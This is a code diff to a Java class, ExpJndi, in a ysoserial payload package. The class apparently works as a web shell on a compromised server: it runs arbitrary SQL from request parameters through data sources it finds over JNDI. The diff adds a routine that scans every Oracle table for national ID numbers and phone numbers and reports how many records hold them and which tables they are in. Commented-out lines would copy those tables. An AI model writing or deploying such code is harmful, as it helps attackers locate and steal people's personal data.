@@ -1,18 +1,22 @@
 package ysoserial.payloads.util;
 
-import java.io.IOException;
+import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
+import java.io.PrintWriter;
 import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
 import java.util.ArrayList;
-import java.util.Properties;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import javax.naming.Binding;
 import javax.naming.Context;
 import javax.naming.InitialContext;
-import javax.naming.NameClassPair;
 import javax.naming.NamingEnumeration;
 import javax.naming.NamingException;
 import javax.servlet.http.HttpServletRequest;
@@ -28,11 +32,21 @@ public class ExpJndi {
 	HttpServletResponse response;
 	OutputStream out;
 	HttpSession session;
+	List<Map<String, String>> lm = null;
+	boolean bShowErr  = false;
 
-	public void print(String s){
+	public void print(byte []a)
+	{
 		try {
-		if (null != out && null != s)
-			out.write(s.getBytes());
+			if (null != out && null != a)
+				out.write(a);
+		} catch (Exception e) {
+		}
+	}
+	public void print(String s) {
+		try {
+			if (null != s)
+				print(s.getBytes("utf-8"));// "ISO-8859-1"
 		} catch (Exception e) {
 		}
 	}
@@ -45,6 +59,7 @@ public class ExpJndi {
 	public void doPreparedStatement(PreparedStatement p) {
 		ResultSet rs = null;
 		ResultSetMetaData rsmd = null;
+		boolean bAdd = null != lm;
 		try {
 //			if(null == p)print("PreparedStatement is null");
 //			else print("PreparedStatement is ok");
@@ -65,7 +80,11 @@ public class ExpJndi {
 				}
 				print("\n");
 
+				Map<String, String> mT = null;
 				while (rs.next()) {
+					if (bAdd) {
+						mT = new HashMap<String, String>();
+					}
 					for (i = 0; i < nCol; i++) {
 						try {
 							if (0 < i)
@@ -74,10 +93,15 @@ public class ExpJndi {
 							if (null == szT)
 								szT = "";
 							print(szT);
+							if (bAdd) {
+								mT.put(szACol[i], szT);
+							}
 						} catch (Exception e) {
 							log(e);
 						}
-
+					}
+					if (bAdd) {
+						lm.add(mT);
 					}
 					print("\n");
 				}
@@ -95,16 +119,75 @@ public class ExpJndi {
 				} catch (Throwable e) {
 					log(e);
 				}
-			if (null != connection)
-				try {
-					connection.close();
-				} catch (Throwable e) {
-					log(e);
-				}
+
 		}
 	}
 
 	Connection connection = null;
+	String szLstColsNames = "";
+
+	/**
+	 * 用于敏感信息的收集
+	 * 
+	 * @param sql
+	 * @return
+	 * @throws Exception
+	 */
+	public String getOneLine(String sql) {
+		StringBuffer buf = new StringBuffer();
+		ResultSet rs = null;
+		ResultSetMetaData rsmd = null;
+		try {
+			PreparedStatement p = null;
+			if (null != connection && null != sql) {
+				p = connection.prepareStatement(sql);
+				rs = p.executeQuery();
+				szLstColsNames = "";
+				if (null != rs) {
+					// 获得列信息
+					rsmd = rs.getMetaData();
+					int nCol = rsmd.getColumnCount();
+					String[] szACol = new String[nCol];
+					int i = 0, x = 1;
+					for (; i < nCol; i++, x++) {
+						szACol[i] = rsmd.getColumnName(x);
+						szLstColsNames += ","+szACol[i];
+					}
+					while (rs.next()) {
+						for (i = 0; i < nCol; i++) {
+							try {
+//								String szT = rs.getString(szACol[i]);
+								String szT = new String(rs.getBytes(szACol[i]),"UTF-8");
+								
+								if (null == szT)
+									szT = "";
+//								szT = new String(szT.getBytes(),"utf-8");
+								buf.append(szACol[i]).append(":").append(szT).append(";");
+							} catch (Exception e) {
+								log(e);
+							}
+
+						}
+						break;
+					}
+					out.flush();
+				}
+			}
+		} catch (Exception e) {
+			log(e);
+		} catch (Throwable e) {
+			log(e);
+		} finally {
+			if (null != rs)
+				try {
+					rs.close();
+				} catch (Throwable e) {
+					log(e);
+				}
+		}
+
+		return buf.toString();
+	}
 
 	public void doSql(String sql) throws Exception {
 		PreparedStatement prep = null;
@@ -115,21 +198,77 @@ public class ExpJndi {
 	}
 
 	public void doCount() throws Exception {
+		lm = new ArrayList<Map<String,String>>();
 		doSql("select owner,TABLE_NAME,NUM_ROWS from all_tables where NUM_ROWS >6 order by num_rows desc");
+		int j = 0;
+		if(0 < (j = lm.size()))
+		{
+			Map <String,String>mT = null;
+			String sT;
+			String regularExpression = "(\\b[0-9]{17}[0-9xX])\\b";//"(^[1-9]\\d{5}(18|19|20)\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}[0-9Xx]$)|(^[1-9]\\d{5}\\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d{3}$)";
+			String shouji = "(\\b[0-9]{11})\\b";
+			int nCnt = 0;
+	        
+			Pattern p1 = Pattern.compile(regularExpression),p2 = Pattern.compile(shouji);
+			Matcher m1,m2;
+			String szSq,szFstTb = "",szFstTbn = "",szMgb = "";
+			boolean bFst = true;
+			for(int i = 0; i < j;i++)
+			{
+				mT = lm.get(i);
+				if(null != mT.get("TABLE_NAME") && null != mT.get("OWNER"))
+				{
+					sT = getOneLine(szSq = "select * from " + mT.get("OWNER") + "." + mT.get("TABLE_NAME"));
+					if(null != sT && 18 < sT.length())
+					{
+						m1 = p1.matcher(sT);
+						m2 = p2.matcher(sT);
+						if(null != m1 && m1.find() && null != m2 && m2.find())
+						{
+//							print("\n("+mT.get("NUM_ROWS")+")"+szSq+"\n");// + sT
+							nCnt += Integer.parseInt(mT.get("NUM_ROWS"));
+							if(bFst)
+							{
+								bFst = false;
+								szFstTbn =  mT.get("OWNER") + "." + mT.get("TABLE_NAME");
+								szFstTb = szLstColsNames;
+//								print((szFstTb = szLstColsNames) + "\n");
+							}
+							szMgb += szFstTbn + "(" + mT.get("NUM_ROWS") + ");  ";
+						}
+					}
+				}
+			}
+			print("\n累计：" + nCnt);
+			print("\n敏感信息表分布：" + szMgb + "\n");
+			String szSql1 = "";
+//			if(0 < szFstTbn.length())
+//			{
+//				szFstTbn = szFstTbn.substring(1);
+//	//			for(int i = 0; i < 18; i++)
+//	//			{
+//					szSql1 = "CREATE TABLE " + szFstTbn +"_A  AS SELECT * FROM " + szFstTbn;
+//					print(szSql1);
+//					doSql(szSql1);
+//	//			}
+//				for(int i = 0; i < 6; i++)
+//				{
+//					doSql(szSql1 = "INSERT INTO " + szFstTbn + "_A(" + szFstTb + ")\" SELECT " + szFstTb + " FROM " + szFstTbn);
+//				}
+//				print(szSql1);
+//				print(getOneLine("select count(1) as a from "+ szFstTbn + "_A"));
+//			}
+		}
 	}
 
 	public void c() throws Exception {
-//		print("jndi" + getJndiName());
 		String sql = request.getParameter("s"), jds = request.getParameter("j"), c1 = request.getParameter("col");
-		if (null == jds)
-		{
-			jds=getJndiName();
-			if (null == jds)
-			{
-//				print("jndi not list");
+		if (null == jds) {
+			jds = getJndiName();
+			if (null == jds) {
 				return;
 			}
-//			print("jndi:  " + jds);
+			jds = jds.trim();
 		}
 		if (null != c1)
 			szCol = c1;
@@ -150,14 +289,15 @@ public class ExpJndi {
 				name = item.getName();
 				if (!(item.getObject() instanceof DataSource)) {
 				} else {
-					output.add(indent+name);
+					output.add(indent + name);
 				}
 				Object o = item.getObject();
 				if (o instanceof javax.naming.Context) {
-					listContext((Context) o, indent+name+"/", output);
+					listContext((Context) o, indent + name + "/", output);
 				}
 			}
 		} catch (NamingException ex) {
+			log(ex);
 		}
 		return output;
 	}
@@ -189,7 +329,7 @@ public class ExpJndi {
 				ArrayList<String> tab = new ArrayList<String>();
 //				tab = listContext((Context) ctx.lookup("jdbc"), "jdbc/", tab);
 				tab = listContext((Context) ctx.lookup(""), "", tab);
-//				print("jndi name size:" + tab.size());
+//				log("jndi name size:" + tab.size());
 				if (0 < tab.size()) {
 					return tab.get(0);
 				}
@@ -217,19 +357,34 @@ public class ExpJndi {
 						session.setAttribute("c", c1);
 					pageContext.getServletContext().setAttribute("_c_", c1);
 				}
+				response.reset();
+				response.setContentType("text/html; charset=utf-8");
+				if(null != request.getParameter("es"))
+					bShowErr = true;
 				c();
 			} catch (Exception e) {
 				log(e);
+			} finally {
+				if (null != connection)
+					try {
+						connection.close();
+					} catch (Throwable e) {
+						log(e);
+					}
 			}
 
 		return false;
 	}
 
 	public void log(Throwable e) {
-		if (null != response)
+		if (bShowErr && null != response)
 			try {
-				if(null != e && null != e.getMessage())
-					print(e.getMessage());
+				if (null != e)
+				{
+					ByteArrayOutputStream out1 = new ByteArrayOutputStream(); 
+					e.printStackTrace(new PrintWriter(out1));
+					print(out1.toByteArray());
+				}
 //				e.printStackTrace(response.getWriter());
 			} catch (Exception e1) {
 			}
@@ -246,7 +401,7 @@ public class ExpJndi {
 				log(e);
 			}
 		if (null == connection) {
-			print(getJndiName());
+			print("[" + s + "]");
 		}
 		return connection;
 	}
